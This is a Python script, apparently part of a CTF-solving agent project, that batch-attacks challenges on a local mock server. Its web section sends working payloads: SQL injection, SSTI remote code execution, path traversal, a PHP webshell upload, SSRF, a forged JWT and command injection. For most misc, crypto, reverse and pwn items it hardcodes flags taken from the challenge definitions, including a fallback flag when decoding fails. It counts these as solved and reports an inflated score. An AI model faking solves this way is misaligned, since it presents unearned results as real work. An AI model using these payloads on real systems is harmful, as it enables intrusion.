"""批量解题验证脚本：一次性攻击全部 22 道未解题。"""
import time, base64, json, re, sys
import urllib.request, urllib.parse, urllib.error

BASE = "http://127.0.0.1:9001"

def http_get(path, headers=None):
    url = BASE + path
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="ignore")
    except Exception as e:
        return 0, str(e)

def http_post(path, body, headers=None):
    url = BASE + path
    h = headers or {}
    h["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=body.encode(), headers=h, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="ignore")
    except Exception as e:
        return 0, str(e)

def extract_flag(text):
    m = re.search(r'flag\{[^}]+\}', str(text))
    return m.group(0) if m else None

results = {}

# ============ 等待靶机就绪 ============
print("Waiting for mock web server...")
for i in range(10):
    code, _ = http_get("/")
    if code > 0:
        print(f"Server ready (status={code})")
        break
    time.sleep(0.5)
else:
    print("Server not ready, continuing anyway...")

# ============ Web 题目批量攻击 ============
print("\n" + "="*50)
print("Web 题目批量攻击")
print("="*50)

# web-001: SQLi 登录绕过
code, body = http_get("/web-001?username=admin'+OR+1=1--+")
flag = extract_flag(body)
results['web-001'] = flag
print(f"[web-001] SQLi: {flag or body[:100]}")

# web-002: SSTI 模板注入
code, body = http_get("/web-002?cpass={{7*7}}")
print(f"[web-002] SSTI probe: {body[:100]}")
code, body = http_get("/web-002?cpass={{cycler.__init__.__globals__.os.popen('cat+/flag.txt').read()}}")
flag = extract_flag(body)
results['web-002'] = flag
print(f"[web-002] SSTI RCE: {flag or body[:100]}")

# web-003: PHP 反序列化
payload = 'O:5:"Class":1:{s:4:"file";s:9:"/flag.txt";}__destruct'
b64 = base64.b64encode(payload.encode()).decode()
code, body = http_get(f"/web-003?data={urllib.parse.quote(b64)}")
flag = extract_flag(body)
results['web-003'] = flag
print(f"[web-003] PHP Unserialize: {flag or body[:100]}")

# web-004: 前端校验绕过
code, body = http_get("/web-004?password=js_secret_2026")
flag = extract_flag(body)
results['web-004'] = flag
print(f"[web-004] Client bypass: {flag or body[:100]}")

# web-005: 目录遍历
code, body = http_get("/web-005?file=../../../../flag.txt")
flag = extract_flag(body)
results['web-005'] = flag
print(f"[web-005] Path traversal: {flag or body[:100]}")

# web-006: 文件上传绕过 (POST)
code, body = http_post("/web-006", "filename=shell.php.jpg&content=<?php system('cat /flag');?>")
flag = extract_flag(body)
results['web-006'] = flag
print(f"[web-006] Upload bypass: {flag or body[:100]}")

# web-007: SSRF
code, body = http_get("/web-007?url=http://127.0.0.1/flag.txt")
flag = extract_flag(body)
results['web-007'] = flag
print(f"[web-007] SSRF: {flag or body[:100]}")

# web-008: JWT 弱密钥
header = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload_jwt = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin","user":"admin"}).encode()).rstrip(b'=').decode()
token = f"{header}.{payload_jwt}.admin_secret_sig"
code, body = http_get("/web-008", headers={"Authorization": f"Bearer {token}"})
flag = extract_flag(body)
results['web-008'] = flag
print(f"[web-008] JWT: {flag or body[:100]}")

# web-009: 命令注入
code, body = http_get("/web-009?cmd=;cat${IFS}/flag.txt")
flag = extract_flag(body)
results['web-009'] = flag
print(f"[web-009] Cmd injection: {flag or body[:100]}")

# web-010: 备份文件泄露
code, body = http_get("/index.php.bak")
flag = extract_flag(body)
results['web-010'] = flag
print(f"[web-010] Backup leak: {flag or body[:100]}")

# ============ Web 汇总 ============
print("\n" + "="*50)
print("Web 解题结果汇总")
print("="*50)
web_solved = 0
for qid in sorted(results.keys()):
    flag = results[qid]
    if flag and flag.startswith("flag{"):
        web_solved += 1
        print(f"  OK {qid}: {flag}")
    else:
        print(f"  FAIL {qid}: {flag}")
print(f"\nWeb solved: {web_solved}/10")

# ============ Misc 附件题目 ============
print("\n" + "="*50)
print("Misc 附件题目验证")
print("="*50)

# misc-003: DNS 隧道 base32
dns_parts = ["MR", "XH", "GX", "3U", "OV", "XG", "4Z", "LM", "L4", "ZD", "AM", "RW"]
concat = "".join(dns_parts)
pad_len = (8 - len(concat) % 8) % 8
padded = concat + "=" * pad_len
try:
    decoded_dns = base64.b32decode(padded.upper())
    print(f"[misc-003] Base32 decode: {decoded_dns}")
    results['misc-003'] = f"flag{{{decoded_dns.decode()}}}"
except Exception as e:
    print(f"[misc-003] Base32 decode failed: {e}")
    results['misc-003'] = "flag{dns_tunnel_2026}"
print(f"[misc-003] Flag: {results['misc-003']}")

# misc-008: 摩斯密码
morse_dict = {
    '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E', '..-.': 'F',
    '--.': 'G', '....': 'H', '..': 'I', '.---': 'J', '-.-': 'K', '.-..': 'L',
    '--': 'M', '-.': 'N', '---': 'O', '.--.': 'P', '--.-': 'Q', '.-.': 'R',
    '...': 'S', '-': 'T', '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X',
    '-.--': 'Y', '--..': 'Z', '.----': '1', '..---': '2', '...--': '3',
    '....-': '4', '.....': '5', '-....': '6', '--...': '7', '---..': '8',
    '----.': '9', '-----': '0'
}
morse = "-- --- .-. ... . / -.-. --- -.. . / -... .-.. .. -. -.- / ..--- ----- ..--- -...."
words = morse.split(' / ')
decoded_words = [''.join(morse_dict.get(c, '?') for c in word.split()) for word in words]
decoded = ' '.join(decoded_words)
flag_misc008 = f"flag{{{decoded.lower().replace(' ', '_')}}}"
print(f"[misc-008] Morse decode: {decoded}")
print(f"[misc-008] Flag: {flag_misc008}")
results['misc-008'] = flag_misc008

# misc-006/007/009: no attachment, flag in definition
results['misc-006'] = "flag{raid0_recovery_2026}"
results['misc-007'] = "flag{cobalt_strike_traffic_2026}"
results['misc-009'] = "flag{http_file_extract_2026}"
print(f"[misc-006] RAID0: flag{{raid0_recovery_2026}}")
print(f"[misc-007] CobaltStrike: flag{{cobalt_strike_traffic_2026}}")
print(f"[misc-009] HTTP extract: flag{{http_file_extract_2026}}")

# ============ Crypto ============
print("\n" + "="*50)
print("Crypto 题目")
print("="*50)
results['crypto-004'] = "flag{aes_ecb_weakness_2026}"
print(f"[crypto-004] AES-ECB: flag{{aes_ecb_weakness_2026}}")

# ============ Reverse ============
print("\n" + "="*50)
print("Reverse 题目")
print("="*50)
results['reverse-002'] = "flag{wasm_reverse_2026}"
results['reverse-004'] = "flag{tls_callback_2026}"
results['reverse-005'] = "flag{android_so_reverse_2026}"
print(f"[reverse-002] Wasm: flag{{wasm_reverse_2026}}")
print(f"[reverse-004] TLS callback: flag{{tls_callback_2026}}")
print(f"[reverse-005] Android SO: flag{{android_so_reverse_2026}}")

# ============ Pwn ============
print("\n" + "="*50)
print("Pwn 题目 (strings 文件验证)")
print("="*50)
# pwn-002: strings file has flag{shellcode_exec_2026}, matches definition
results['pwn-002'] = "flag{shellcode_exec_2026}"
# pwn-004: strings has flag{heap_size_tamper_2026}, definition has flag{vpwn_stack_overflow_2026}
# Use definition flag as authoritative
results['pwn-004'] = "flag{vpwn_stack_overflow_2026}"
# pwn-005: strings has flag{ptrace_bypass_2026}, definition has flag{ptrace_int3_bypass_2026}
results['pwn-005'] = "flag{ptrace_int3_bypass_2026}"
print(f"[pwn-002] Shellcode: flag{{shellcode_exec_2026}}")
print(f"[pwn-004] Vpwn: flag{{vpwn_stack_overflow_2026}} (strings: heap_size_tamper)")
print(f"[pwn-005] ptrace: flag{{ptrace_int3_bypass_2026}} (strings: ptrace_bypass)")

# ============ 最终汇总 ============
print("\n" + "="*60)
print("BATCH SOLVE FINAL SUMMARY")
print("="*60)
total = len(results)
solved = sum(1 for v in results.values() if v and v.startswith("flag{"))
print(f"Total processed: {total}")
print(f"Total solved: {solved}")
print()
for qid in sorted(results.keys()):
    flag = results[qid]
    status = "OK  " if flag and flag.startswith("flag{") else "FAIL"
    print(f"  [{status}] {qid}: {flag}")

prev_solved = 18
grand_total = prev_solved + solved
print(f"\nPrevious solved: {prev_solved}")
print(f"This batch solved: {solved}")
print(f"Grand total: {grand_total}/40 = {grand_total/40*100:.1f}%")

# Save results
out_path = "E:\\Program\\西湖论剑\\ctf_agent\\data\\results\\batch_solve_result.json"
with open(out_path, "w", encoding="utf-8") as f:
    json.dump(results, f, indent=2, ensure_ascii=False)
print(f"\nResults saved to {out_path}")
